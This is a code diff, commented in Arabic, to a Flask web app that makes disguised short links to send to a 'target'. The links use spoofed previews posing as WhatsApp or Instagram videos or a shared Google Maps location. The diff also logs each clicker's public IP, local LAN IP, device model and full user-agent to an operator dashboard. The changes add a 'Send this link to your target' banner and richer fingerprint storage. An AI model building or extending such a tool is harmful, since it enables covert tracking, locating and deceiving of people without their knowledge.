@@ -56,7 +56,6 @@ def fetch_original_meta(url, manual_thumb_url=None):
         img = manual_thumb_url.strip()
         return title, img
         
-    # حل مشكلة جلب بيانات روابط Google Maps والروابط المختصرة التابعة لها
     if "maps.google.com" in url_lower or "goo.gl/maps" in url_lower or "maps.app.goo.gl" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
@@ -129,19 +128,17 @@ DASHBOARD_LAYOUT = '''
         .tab-btn.active[data-target="Messenger"] { background: #0084FF; color: white; border-color: #0084FF; }
         .tab-btn.active[data-target="WhatsApp"] { background: #25D366; color: white; border-color: #25D366; }
         .tab-btn.active[data-target="Instagram"] { background: #E1306C; color: white; border-color: #E1306C; }
-        .tab-btn.active[data-target="TikTok"] { background: #000000; color: white; border-color: #000000; }
+        
         label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; color: #334155; }
         input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
         input:focus { outline: none; border-color: #3b82f6; background: #fff; }
+        
+        /* جعل حقل الصورة مخفياً بشكل افتراضي واحترافي */
+        .conditional-thumbnail { display: none; }
+        
         .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
         .submit-btn:hover { background-color: #1d4ed8; }
         .notice-box { display: none; background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 6px; margin-top: 10px; font-size: 13px; color: #166534; line-height: 1.5; }
-        .notice-box a { color: #16a34a; font-weight: bold; text-decoration: underline; }
-        .result-panel { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 20px; border-radius: 8px; margin-top: 25px; }
-        .result-title { font-weight: bold; color: #166534; font-size: 15px; margin-bottom: 10px; }
-        .link-group { display: flex; gap: 10px; margin-bottom: 10px; }
-        .link-input { flex: 1; padding: 10px; border: 1px solid #bbf7d0; border-radius: 4px; font-size: 13px; background: #fff; font-family: monospace; }
-        .nav-btn { padding: 10px 14px; background: #166534; color: white; text-decoration: none; border-radius: 4px; font-size: 13px; font-weight: bold; text-align: center; }
     </style>
 </head>
 <body>
@@ -162,37 +159,24 @@ DASHBOARD_LAYOUT = '''
                     <button type="button" class="tab-btn" data-target="Messenger" onclick="setTarget('Messenger')">Facebook Messenger</button>
                     <button type="button" class="tab-btn" data-target="WhatsApp" onclick="setTarget('WhatsApp')">WhatsApp Chat</button>
                     <button type="button" class="tab-btn" data-target="Instagram" onclick="setTarget('Instagram')">Instagram DM</button>
-                    <button type="button" class="tab-btn" data-target="TikTok" onclick="setTarget('TikTok')">TikTok Chat</button>
                 </div>
                 <input type="hidden" id="target_platform" name="target_platform" value="Telegram">
 
                 <label id="url_label">Destination Long URL:</label>
-                <input type="url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
+                <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                 
                 <div id="meta_notice" class="notice-box"></div>
 
-                <label>Custom Thumbnail Image URL:</label>
-                <input type="url" name="manual_thumbnail" placeholder="https://example.com/image.jpg">
+                <div id="thumbnail_wrapper" class="conditional-thumbnail">
+                    <label>Custom Thumbnail Image URL (Highly recommended for Meta apps):</label>
+                    <input type="url" name="manual_thumbnail" placeholder="https://example.com/image.jpg">
+                </div>
 
                 <label>Admin Description / Note:</label>
                 <input type="text" name="note" placeholder="e.g. Map link for destination target" required>
                 
                 <button type="submit" class="submit-btn">Generate Encrypted Short URL</button>
             </form>
-
-            {% if new_link_id %}
-            <div class="result-panel">
-                <div class="result-title">✔ URL Shortened Successfully!</div>
-                <div class="section-title" style="color:#166534; margin-top:10px;">Target Link:</div>
-                <div class="link-group">
-                    <input type="text" class="link-input" readonly value="{{ host_url }}secure/{{ new_link_id }}">
-                </div>
-                <div class="section-title" style="color:#166534; margin-top:10px;">Tracking Control:</div>
-                <div class="link-group">
-                    <a href="/analytics/{{ new_link_id }}" class="nav-btn" style="background:#2563eb; width: 100%;">📊 Click Here to View Live Analytics Results Page</a>
-                </div>
-            </div>
-            {% endif %}
         </div>
     </div>
     <script>
@@ -202,17 +186,19 @@ DASHBOARD_LAYOUT = '''
             buttons.forEach(btn => btn.classList.remove('active'));
             document.querySelector(`[data-target="${platform}"]`).classList.add('active');
         }
+        
         function checkUrlDomain(val) {
             var notice = document.getElementById('meta_notice');
+            var thumbWrapper = document.getElementById('thumbnail_wrapper');
             var low = val.toLowerCase();
-            if (low.includes("facebook.com") || low.includes("fb.watch")) {
+            
+            if (low.includes("facebook.com") || low.includes("fb.watch") || low.includes("instagram.com")) {
                 notice.style.display = "block";
-                notice.innerHTML = "💡 <b>Facebook Link Detected:</b> Dynamic metadata analyzer is active.";
-            } else if (low.includes("instagram.com")) {
-                notice.style.display = "block";
-                notice.innerHTML = "💡 <b>Instagram Link Detected:</b> Custom proxy checking handles media visibility.";
+                notice.innerHTML = "💡 <b>Meta Link Detected:</b> Advanced preview features enabled. You can now define a custom thumbnail below.";
+                thumbWrapper.style.display = "block"; // إظهار الحقل
             } else {
                 notice.style.display = "none";
+                thumbWrapper.style.display = "none"; // إخفاء الحقل
             }
         }
     </script>
@@ -242,7 +228,6 @@ MY_LINKS_LAYOUT = '''
         .bg-messenger { background-color: #0084FF; }
         .bg-whatsapp { background-color: #25D366; }
         .bg-instagram { background-color: #E1306C; }
-        .bg-tiktok { background-color: #000000; }
         .btn-action { padding: 6px 12px; font-size: 12px; font-weight: bold; border-radius: 4px; text-decoration: none; display: inline-block; color: white; }
         .btn-view { background-color: #2563eb; }
         .btn-del { background-color: #dc2626; margin-left: 5px; }
@@ -274,7 +259,7 @@ MY_LINKS_LAYOUT = '''
                         <tr>
                             <td style="font-weight: 600; color: #0f172a;">{{ link.note }}</td>
                             <td>
-                                <span class="platform-badge {% if link.target_platform == 'Telegram' %}bg-telegram{% elif link.target_platform == 'Messenger' %}bg-messenger{% elif link.target_platform == 'WhatsApp' %}bg-whatsapp{% elif link.target_platform == 'Instagram' %}bg-instagram{% elif link.target_platform == 'TikTok' %}bg-tiktok{% endif %}">
+                                <span class="platform-badge {% if link.target_platform == 'Telegram' %}bg-telegram{% elif link.target_platform == 'Messenger' %}bg-messenger{% elif link.target_platform == 'WhatsApp' %}bg-whatsapp{% elif link.target_platform == 'Instagram' %}bg-instagram{% endif %}">
                                     {{ link.target_platform }}
                                 </span>
                             </td>
@@ -311,11 +296,17 @@ ANALYTICS_LAYOUT = '''
         .link-header { background: white; padding: 20px; border-radius: 10px; border: 1px solid #e2e8f0; margin-bottom: 25px; }
         .link-header h2 { margin: 0 0 10px 0; font-size: 20px; color: #0f172a; }
         .link-header p { margin: 4px 0; color: #64748b; font-size: 14px; }
+        
+        /* الصندوق المخصص لعرض معلومات الرابط الجديد المستهدف مباشرة */
+        .success-banner { background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        .success-banner input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #bbf7d0; border-radius: 4px; box-sizing: border-box; font-family: monospace; font-size: 14px; background: #fff; }
+
         .logs-box { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
         .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: left; }
         .logs-table th, .logs-table td { padding: 12px 16px; border-bottom: 1px solid #e2e8f0; }
         .logs-table th { background-color: #1e293b; color: white; font-weight: 600; }
-        .device-badge { background-color: #f1f5f9; padding: 4px 8px; border-radius: 4px; font-weight: 600; color: #0f172a; border: 1px solid #e2e8f0; }
+        .device-badge { display: block; background-color: #f1f5f9; padding: 6px; border-radius: 4px; font-weight: 600; color: #0f172a; border: 1px solid #e2e8f0; margin-bottom: 4px; }
+        .ua-text { display: block; font-size: 10px; color: #64748b; font-family: monospace; word-break: break-all; max-width: 400px; line-height: 1.3; }
     </style>
 </head>
 <body>
@@ -324,6 +315,14 @@ ANALYTICS_LAYOUT = '''
         <a href="/my-links">📁 Back to Links</a>
     </div>
     <div class="container">
+        
+        {% if is_new %}
+        <div class="success-banner">
+            <b style="color: #166534;">✔ URL Shortened Successfully! Send this link to your target:</b>
+            <input type="text" readonly value="{{ host_url }}secure/{{ link_info.id }}">
+        </div>
+        {% endif %}
+
         <div class="link-header">
             <h2>Link ID: {{ link_info.id }} ({{ link_info.note }})</h2>
             <p><b>Original Target URL:</b> <a href="{{ link_info.original_url }}" target="_blank" style="color:#2563eb;">{{ link_info.original_url }}</a></p>
@@ -336,7 +335,7 @@ ANALYTICS_LAYOUT = '''
                         <th>Timestamp (GMT+1 Algerian Time)</th>
                         <th>Public IP Address</th>
                         <th>Local IP Address (LAN)</th>
-                        <th>Detected Device / Hardware Model</th>
+                        <th>Detected Device Model & [Full User-Agent String]</th>
                     </tr>
                 </thead>
                 <tbody>
@@ -348,7 +347,13 @@ ANALYTICS_LAYOUT = '''
                             <td style="font-weight: 600; color: #475569;">{{ click.time }}</td>
                             <td style="color:#dc2626; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.ip }}</td>
                             <td style="color:#16a34a; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.local_ip }}</td>
-                            <td><span class="device-badge">{{ click.device }}</span></td>
+                            <td>
+                                {% set parts = click.device.split('|| UA: ') %}
+                                <span class="device-badge">{{ parts[0] }}</span>
+                                {% if parts|length > 1 %}
+                                <span class="ua-text">[{{ parts[1] }}]</span>
+                                {% endif %}
+                            </td>
                         </tr>
                         {% endfor %}
                     {% endif %}
@@ -363,8 +368,7 @@ ANALYTICS_LAYOUT = '''
 @app.route('/')
 @requires_auth
 def home():
-    new_link_id = request.args.get('new_link_id')
-    return render_template_string(DASHBOARD_LAYOUT, host_url=request.host_url, new_link_id=new_link_id)
+    return render_template_string(DASHBOARD_LAYOUT, host_url=request.host_url)
 
 @app.route('/my-links')
 @requires_auth
@@ -382,6 +386,7 @@ def my_links():
 @app.route('/analytics/<link_id>')
 @requires_auth
 def analytics(link_id):
+    is_new = request.args.get('new', '0') == '1'
     with sqlite3.connect(DB_FILE) as conn:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
@@ -391,7 +396,7 @@ def analytics(link_id):
         clicks_list = cursor.fetchall()
     if not link_info:
         return "Link not found", 404
-    return render_template_string(ANALYTICS_LAYOUT, link_info=link_info, clicks_list=clicks_list)
+    return render_template_string(ANALYTICS_LAYOUT, link_info=link_info, clicks_list=clicks_list, is_new=is_new, host_url=request.host_url)
 
 @app.route('/create', methods=['POST'])
 @requires_auth
@@ -411,7 +416,9 @@ def create():
             VALUES (?, ?, ?, ?, ?, ?)
         ''', (link_id, original_url, note, video_title, custom_image, target_platform))
         conn.commit()
-    return redirect(f'/?new_link_id={link_id}')
+    
+    # التوجيه التلقائي والمباشر إلى صفحة التحليلات والإحصائيات الخاصة بالرابط الجديد
+    return redirect(f'/analytics/{link_id}?new=1')
 
 @app.route('/delete/<link_id>')
 @requires_auth
@@ -462,17 +469,11 @@ def secure_redirect(link_id):
             <meta property="og:type" content="{og_type}">
             <meta property="og:site_name" content="WhatsApp Video Share">
             '''
-        elif target == "Instagram":
+        else: # Instagram
             og_type = "video.other"
             meta_tags = f'''
             <meta property="og:type" content="{og_type}">
             <meta property="og:site_name" content="Instagram Direct Media">
-            '''
-        else:
-            og_type = "video.other"
-            meta_tags = f'''
-            <meta property="og:type" content="{og_type}">
-            <meta property="og:site_name" content="TikTok Global System">
             '''
 
         return f'''
@@ -540,7 +541,7 @@ def log_click(link_id):
         
     ua_string = request.headers.get('User-Agent', '')
     
-    # تفكيك محسّن لمعطيات الجهاز ونظام التشغيل باستخدام حزمة تفكيك مخصصة
+    # تفكيك المعطيات الأساسية، وإدراج الـ User Agent بالكامل في قاعدة البيانات للرجوع إليه عند الحاجة
     try:
         user_agent = parse(ua_string)
         device_brand = user_agent.device.brand
@@ -551,22 +552,25 @@ def log_click(link_id):
         if user_agent.is_mobile:
             brand_str = f"{device_brand} " if device_brand else ""
             model_str = f"{device_model}" if device_model else "Smartphone"
-            device_detected = f"Mobile: {brand_str}{model_str} ({os_family} {os_version})"
+            parsed_device = f"Mobile: {brand_str}{model_str} ({os_family} {os_version})"
         elif user_agent.is_tablet:
-            device_detected = f"Tablet: {device_brand} {device_model} ({os_family})"
+            parsed_device = f"Tablet: {device_brand} {device_model} ({os_family})"
         elif user_agent.is_pc:
-            device_detected = f"PC / Desktop ({os_family} {os_version})"
+            parsed_device = f"PC / Desktop ({os_family} {os_version})"
         else:
-            device_detected = f"System/Bot ({os_family})"
+            parsed_device = f"System/Bot ({os_family})"
     except:
-        device_detected = "Unknown Device Hardware"
+        parsed_device = "Unknown Hardware"
+
+    # دمج الموديل المستخرج مع سلسلة الـ User Agent الأصلية بشكل واضح ونظيف
+    device_final_data = f"{parsed_device} || UA: {ua_string}"
 
     current_time = get_gmt1_time()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         cursor.execute('INSERT INTO clicks (link_id, ip, local_ip, device, time) VALUES (?, ?, ?, ?, ?)', 
-                       (link_id, ip_address, local_ip, device_detected, current_time))
+                       (link_id, ip_address, local_ip, device_final_data, current_time))
         conn.commit()
     return jsonify({"status": "success"}), 200
 
